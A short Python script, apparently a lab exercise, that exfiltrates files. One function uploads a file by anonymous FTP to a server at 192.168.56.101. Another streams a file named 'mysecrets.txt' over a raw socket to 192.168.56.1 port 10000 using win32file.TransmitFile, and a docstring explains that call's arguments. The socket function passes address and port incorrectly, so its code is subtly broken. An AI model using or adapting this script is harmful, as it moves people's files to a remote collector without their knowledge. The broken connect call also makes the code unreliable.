import ftplib
import os.path
import socket
import win32file

def plain_ftp(docpath, server="192.168.56.101"):
    ftp = ftplib.FTP(server)
    # 登錄 FTP 伺服器
    ftp.login("anonymous", "anon@test.com")
    # 定位目標
    ftp.cwd('/pub/')
    ftp.storbinary("STOR " + os.path.basename(docpath), open(docpath, "rb"), 1024)
    ftp.quit()

def transmit(document_path):
    client = socket.socket()
    client.connect(("192.168.56.1"), 10000)

    with open(document_path, 'rb') as f:
        # 傳輸文件
        win32file.TransmitFile(client, win32file._get_osfhandle(f.fileno()), 0, 0, 0, None, 0, b'', b'')

if __name__ == '__main__':
    transmit('mysecrets.txt')

'''
win32file.TransmitFile(client, win32file._get_osfhandle(f.fileno()), 0, 0, 0, None, 0, b'', b'')
    1. win32file._get_osfhandle(): extracts the operating system file handle from the 
    file descriptor of the file f. It converts a Python file object (f) to an OS-level file handle.
    2. (0, 0, 0): default behavior
    3. None: Overlapped I/O allows an operation to be started and the calling thread to do other things while the operation completes.
    4. 0: default size
    5. b'': no pre-transmit data
    6. b'': no post-transmit data
'''